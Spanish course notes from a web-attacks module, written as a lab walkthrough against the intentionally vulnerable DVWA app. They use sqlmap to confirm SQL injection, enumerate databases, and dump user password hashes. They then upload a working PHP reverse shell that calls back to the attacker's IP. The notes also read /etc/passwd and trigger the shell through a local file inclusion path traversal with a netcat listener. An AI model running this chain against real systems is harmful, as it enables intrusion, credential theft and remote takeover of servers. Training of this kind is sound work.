---
title: SQL map
modulo: M3 - Ataques Web
fecha: 2025-07-15
vm: https://drive.google.com/drive/folders/17_s4xiWqbh-mRCX5FazMp-pEpokJBE70
layout: apunte
slug: 2025-07-15-sql-map
---
# ğŸ“‹Primeros pasos
## 1. Test SQLmap (detecciÃ³n)
```bash
sqlmap -u "http://10.0.2.X/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=43f0xxx; security=low"
```

ğŸ”¹ **Donde**:
- `-u`: Especifica la URL con el parÃ¡metro vulnerable (*id* en este caso)
- `--cookie`: Es la sesiÃ³n para que no nos saque de DVWA, donde:
	- `PHPSESSID=43f0xxx â†’ Es el ID de sesiÃ³n activa.
	- `security=low` â†’ Nivel de seguridad de DVWA, necesario para mantener la vulnerabilidad activa

O bien,
```bash
sqlmap -r request.txt
```

ğŸ”¹ **Donde** `request.txt` es el archivo con la informaciÃ³n de la request obtenida con BurpSuite.

**RESULTADO ESPERADO**
ğŸ‘‰ **Confirmar la vulnerabilidad SQLi y obtener informaciÃ³n bÃ¡sica**.  
Este es **el primer escaneo**, donde SQLmap:
- EnvÃ­a **payloads de prueba** (`AND 1=1`, `UNION SELECT`, etc.).
- Detecta si el parÃ¡metro `id` es **vulnerable**.
- Identifica **el motor de base de datos** (en este caso, MySQL).

>[!info] Nota:
>Si en algun punto, nos pregunta `got a 302 redirect to 'http://10.0.2.17/dvwa/login.php'. Do you want to follow? [Y/n]` hay que darle a 'n', ya que se podrÃ­a perder la sesiÃ³n

## 2. Enumerar las bases de datos
```bash
sqlmap -u "http://10.0.2.X/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=43f0xxx; security=low" --dbs
```

O bien,
```bash
sqlmap -r request.txt --dbs
```

ğŸ”¹ **Donde**:
- `--dbs`: Es la *flag* que indica al sqlmap que queremos obtener las bases de datos existentes

**RESULTADO ESPERADO**
ğŸ‘‰ **Lista con las bases de datos existentes** (dvwa, information_schema, metasploit, mysql, etc)

## 3. Listar tablas de DVWA
```bash
sqlmap -u "http://10.0.2.X/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=43f0xxx; security=low" -D dvwa --tables
```

O bien,
```bash
sqlmap -r request.txt -D dvwa --tables
```

ğŸ”¹ **Donde**:
- **`-D`**: Especifica la **base de datos** (*dvwa* en este caso)
- **`--tables`**: Le pedimos que **enumere todas las tablas** dentro de esa base de datos.

**RESULTADO ESPERADO**
ğŸ‘‰ **Lista de tablas existentes en la base de datos dvwa**

## 4. Obtener usuarios y contraseÃ±as
```bash
sqlmap -u "http://10.0.2.X/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=43f0xxx; security=low" -D dvwa -T users --dump
```

ğŸ”¹ **Donde**:
- `-T` Especifica la tabla en la base de datos (en este caso, *users*)
- `--dump` Indica a SQLmap que **extraiga todo el contenido** de esa tabla.

**RESULTADO ESPERADO**
ğŸ‘‰ **Tabla sql con los datos que almacena**, y, particularmente en este caso, el hash de las contraseÃ±as (con su de-hash si se activÃ³ la opciÃ³n)

>[!info] Observaciones:
>Cuando pregunta `do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] ` nos da la opciÃ³n de almacenar los *hashes* en un archivo, en caso de querer trabajar aparte con ellos
>Cuando pregunta `do you want to crack them via a dictionary-based attack? [Y/n/q] ` nos da la opciÃ³n de romper las contraseÃ±as utilizando un diccionario
>

## 5. Identificar usuarios de la base de datos
**ğŸŸ£1.1 Identificarse a sÃ­ mismo**
```bash
sqlmap -u "http://10.0.2.X/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=43f0xxx; security=low" --current-user
```

O bien,
```bash
sqlmap -r request.txt --current-user
```

ğŸ”¹ **Donde**:
- `--current-user`: Le pide a SQLmap que identifique al usuario **de la base de datos** con el que se ejecutan las consultas

**RESULTADO ESPERADO**
ğŸ‘‰**Algo como**
>[INFO] fetching current user
>current user: 'root@localhost'


**ğŸŸ£1.2 Â¿Somos admin?**
```bash
sqlmap -u "http://10.0.2.X/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=43f0xxx; security=low" --is-dba
```

O bien,
```bash
sqlmap -r request.txt --is-dba
```

ğŸ”¹ **Donde**:
- `--is-dba`: Pregunta directamente si el **usuario actual de la base de datos** tiene el privilegio **DBA (Administrador de Base de Datos)**, en otras palabras: **Â¿tenemos control total sobre el motor de la base de datos?**

**RESULTADO ESPERADO**
ğŸ‘‰**Algo como**
>[INFO] fetching current user
>current user is DBA: True


**ğŸŸ£1.3 Lista de privilegios**
```bash
sqlmap -u "http://10.0.2.X/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=43f0xxx; security=low" --privileges
```

O bien,
```bash
sqlmap -r request.txt --privileges
```

ğŸ”¹ **Donde**:
- `--privileges`: Le pide a SQLmap que identifique los **privilegios del usuario DE LA BASE DE DATOS en la base de datos**

**RESULTADO ESPERADO**
ğŸ‘‰**Lista de usuarios de la base de datos** junto con los respectivos permisos. Nos interesa que para el usuario que vimos en el punto 1.1 veamos el privilegio `FILE`. El privilegio `FILE` de MySQL permite **leer y escribir archivos** directamente en el sistema Linux, dentro de los **lÃ­mites** de los permisos del usuario `mysql` que ejecuta el servicio.

# ğŸšReverse shell
## 1. Preparar payload (la reverse shell)
Crear un PHP en la Kali:
```php
<?php
set_time_limit (0);
$ip = '10.0.2.X';  // IP de la Kali
$port = 4444; // Puerto donde escucharÃ¡ la Kali
$sock = fsockopen($ip, $port); // Crea un socket con la IP y puerto especificados
$proc = proc_open('/bin/sh', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); //Abre el socket
?>
```
Guardar como `shell.php`.

## 2. Subir la webshell con SQLmap
**ğŸŸ 2.1 Comprobar privilegio FILE**
```bash
sqlmap -u "http://10.0.2.x/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=43f0xxx; security=low" --file-read="/etc/passwd"
```

O bien,
```bash
sqlmap -r request.txt --file-read="/etc/passwd" --file-read="/etc/passwd"
```

ğŸ”¹**Donde**:
- `--file-read`: Le indica a SQLmap que lea un archivo dentro del sistema de archivos **DEL SERVIDOR** (No confundir con la base de datos)
- `/etc/passwd`: Es un archivo tÃ­pico de sistemas Linux, contiene una lista de los usuarios del sistema.

**RESULTADO ESPERADO**
ğŸ‘‰**Si en efecto, tenemos el privilegio `FILE`**, en efecto, al ejecutar este comando nos descargarÃ¡ el contenido, veremos algo como
> files saved to:
>[\*] /home/kali/.local/share/sqlmap/output/10.0.2.X/files/\_etc_passwd (size differs from remote file)

El cual, de hecho, se puede consultar
```bash
cat /home/kali/.local/share/sqlmap/output/10.0.2.X/files/_etc_passwd
```

>[!question] Â¿CÃ³mo saber dÃ³nde subir la shell reversa?:
>Al usar comandos como `--file-read` o `--file-write`, la instrucciÃ³n se ejecuta por **el proceso del servidor MySQL** el cual corre en el **sistema operativo con un usuario especÃ­fico**, que normalmente es *mysql* en Linux. Entonces, estamos limitados a las carpetas donde el usuario *mysql* tiene permisos de escritura
>


**ğŸŸ 2.2Subir shell:**
```bash
sqlmap -u "http://10.0.2.x/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="PHPSESSID=43f0xxx; security=low" \
--file-write="/ruta/absoluta/a/shell.php" \
--file-dest="/var/lib/mysql/hacked.php"
```

ğŸ”¹**Donde**:
- `--file-write`: Es el comando para **subir** un archivo. AquÃ­ especificamos la ruta absoluta del archivo `shell.php` creado anteriormente
- `--file-dest`: Indica el **destino** en el servidor donde se subirÃ¡ el archivo

>[!question] Â¿Por quÃ© /var/lib/mysql/?:
>ğŸ”¹El usuario del sistema operativo que ejecuta MySQL (`mysql`) tiene permisos de escritura ahÃ­.
>ğŸ”¹Intentar escribir en otras rutas como `/var/www/html/` fallaron previamente porque `mysql` no tiene permisos allÃ­.
>ğŸ”¹Aunque la carpeta no es accesible directamente vÃ­a web, se puede **ejecutar usando un LFI (Local File Inclusion)**.

**RESULTADO ESPERADO**
ğŸ‘‰**Si todo sale bien**,veremos algo como
>[INFO] the remote file '/var/lib/mysql/hacked.php' is larger (189 B) than the local file '/home/kali/shell.php' (188B)

## 3. EjecuciÃ³n de la reverse shell
ğŸŸ¢**3.1 Preparar el listener**
Utilizando Netcat, abrimos el puerto de escucha en la Kali. **Debe coincidir con el puerto escrito en `shell.php`**
```bash
nc -lvnp 4444
```

ğŸ”¹**Donde**:
- `-l`: Modo escucha
- `-v`: Modo verbose (nos muestra las conexiones)
- `-n`: No hace resoluciÃ³n DNS
- `-p`: Puerto

ğŸŸ¢**3.2 Activar la shell mediante LFI**
Ya que la shell se guardÃ³ en `/var/lib/mysql/hacked.php`, la ejecutamos **incluyÃ©ndola en la aplicaciÃ³n web** vulnerable a **LFI (Local File Inclusion)**.
Para ello, desde el navegador hay que acceder a:
`http://10.0.2.x/dvwa/vulnerabilities/fi/?page=../../../../../../var/lib/mysql/hacked.php`

ğŸ”¹Donde:
- `/fi/`: Es el recurso web vulnerable a LFI
- `page`: Es el atributo desde donde nos dirigimos a la reverse shell

**RESULTADO ESPERADO**
ğŸ‘‰**Si todo sale bien**, en la terminal Kali veremos algo como:
> listening on [any] 4444 ...
>connect to [IP_KALI] from (UNKNOWN) [IP_DVWA] 41889

**ğŸ‰ Una vez logrado esto, ya podremos ejecutar comandos desde la terminal**
